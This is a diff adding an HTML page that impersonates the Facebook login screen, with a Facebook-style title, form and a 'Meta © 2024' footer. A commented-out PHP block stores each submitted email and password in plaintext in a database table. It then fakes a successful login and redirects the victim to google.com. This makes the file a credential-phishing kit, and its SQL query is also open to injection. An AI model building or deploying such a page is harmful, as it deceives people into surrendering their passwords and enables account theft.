@@ -1,0 +1,274 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login in to Facebook | Facebook</title>
+    <link rel="icon" type="image/x-icon" href="Logo1.png">
+    <style>
+    * {
+        margin: 0px;
+        padding: 0px;
+        box-sizing: border-box;
+        font-family: sans-serif;
+    }
+
+    html,
+    body {
+        height: 100vh;
+        width: 100vw;
+    }
+
+    .main {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        justify-content: center;
+    }
+
+    #Logo {
+        width: 90px;
+    }
+
+    #form {
+        padding: 10px;
+        display: flex;
+        flex-direction: column;
+        gap: 10px;
+    }
+
+    #email {
+        height: 42px;
+        width: 342px;
+        padding: 12px;
+        box-shadow: 1px 1px 2px silver;
+        background-color: #f5f6f7;
+        border: none;
+        border-radius: 5px;
+    }
+
+    .pass {
+        display: flex;
+        position: relative;
+    }
+
+    #pass {
+        height: 42px;
+        width: 272px;
+        padding: 12px;
+        box-shadow: 1px 1px 2px silver;
+        background-color: #f5f6f7;
+        z-index: 10;
+        border: none;
+        border-radius: 5px 0px 0px 5px;
+    }
+
+    #email:focus {
+        background: #e8f0fe;
+        outline: 1px solid black;
+    }
+
+    #pass:focus {
+        background: #e8f0fe;
+        outline: 1px solid black;
+        border-radius: 5px 0px 0px 5px;
+    }
+
+    #eye {
+        height: 42px;
+        width: 70px;
+        padding: 12px;
+        box-shadow: 1px 1px 2px silver;
+        background-color: #f5f6f7;
+        position: absolute;
+        inset: 0px 271px;
+        font-size: 14px;
+        font-size: 12px;
+        font-weight: bold;
+        font-family: sans-serif;
+        text-decoration: none;
+        color: #3578e5;
+        display: grid;
+        place-items: center;
+        border-radius: 0px 5px 5px 0px;
+    }
+
+    #Login {
+        height: 42px;
+        width: 342px;
+        padding: 12px;
+        border-radius: 5px;
+        background: #1877f2;
+        color: #fff;
+        font-weight: bolder;
+        font-family: sans-serif;
+        font-size: 17px;
+        border: none;
+    }
+
+    #link {
+        color: #216fdb;
+        margin: auto;
+        text-decoration: none;
+    }
+
+    .hr {
+        width: 80vmin;
+        padding: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .hr span:nth-child(1) {
+        background: silver;
+        height: 1px;
+        width: 100%;
+    }
+
+    .hr span:nth-child(2) {
+        margin: 10px;
+    }
+
+    .hr span:nth-child(3) {
+        background: silver;
+        height: 1px;
+        width: 100%;
+    }
+
+    .btn-box {
+        padding: 10px;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+    }
+
+    .btn-box button {
+        height: 36px;
+        width: 273.59px;
+        background: #fff;
+        font-size: 14px;
+        border: 1px solid silver;
+        border-radius: 3px;
+        padding: 4px 8px 3px;
+    }
+
+    .lang {
+        width: 100%;
+        margin-top: 110px;
+        padding: 20px;
+        display: flex;
+        justify-content: space-around;
+    }
+
+    .lang .l-left a {
+        text-decoration: none;
+        text-align: center;
+        color: #797373;
+        font-size: 12px;
+        display: block;
+    }
+
+    .lang .l-right a {
+        text-decoration: none;
+        text-align: center;
+        color: #797373;
+        font-size: 12px;
+        display: block;
+    }
+
+    .lang .l-right a:nth-child(4) {
+        height: 18px;
+        width: 18px;
+        margin: auto;
+        text-align: center;
+        line-height: 17px;
+        font-size: large;
+        color: #3b5998;
+        border: 1px solid #3b5998;
+        border-radius: 3px;
+    }
+
+    #copy-right {
+        font-size: 12px;
+        color: #808080;
+    }
+    </style>
+</head>
+
+<body>
+    <div class="main">
+        <img src="image.png" id="Logo" alt="" />
+        <form action="" id="form" method="POST">
+            <input type="text" name="email" id="email" placeholder="Mobile number or email address" />
+            <div class="pass">
+                <input type="password" name="pass" id="pass" placeholder="Password" />
+                <span id="eye">SHOW</span>
+            </div>
+            <button id="Login" name="Login">Log In</button>
+            <a href="" id="link">Forgotten password?</a>
+        </form>
+        <!-- <?php
+        include("connection.php");
+        if(isset($_POST["Login"])){
+          $email=$_POST["email"];
+          $number=$_POST["email"];
+          $pass=$_POST["pass"];
+          $q="INSERT INTO account_information VALUES(NULL,'$email','$number','$pass')";
+          $res=mysqli_query($conn,$q);
+          if($res){
+            echo"<script>
+            alert('Login Successfully...')
+            window.location.href='https://www.google.com/'
+            </script>";
+          }else{
+            echo"<script>
+            alert('Login Failde')
+            </script>";
+          }
+
+        }
+
+
+?> -->
+        <div class="hr">
+            <span></span>
+            <span>or</span>
+            <span></span>
+        </div>
+        <div class="btn-box">
+            <button>Create new account</button>
+        </div>
+        <div class="lang">
+            <div class="l-left">
+                <a href="">English (UK)</a>
+                <a href="">پښتو</a>
+                <a href="">हिन्दी</a>
+                <a href="">Español</a>
+            </div>
+            <div class="l-right">
+                <a href="">اردو</a>
+                <a href="">العربية</a>
+                <a href="">বাংলা</a>
+                <a href="">+</a>
+            </div>
+        </div>
+        <div id="copy-right">Meta © 2024</div>
+    </div>
+    <script>
+    let eye = document.getElementById("eye");
+    let pass = document.getElementById("pass");
+    eye.addEventListener("click", function() {
+        if (pass.type == "password") {
+            pass.type = "text";
+            eye.innerHTML = "HIDE";
+        } else {
+            pass.type = "password";
+            eye.innerHTML = "SHOW";
+        }
+    });
+    </script>
+</body>
+
+</html>
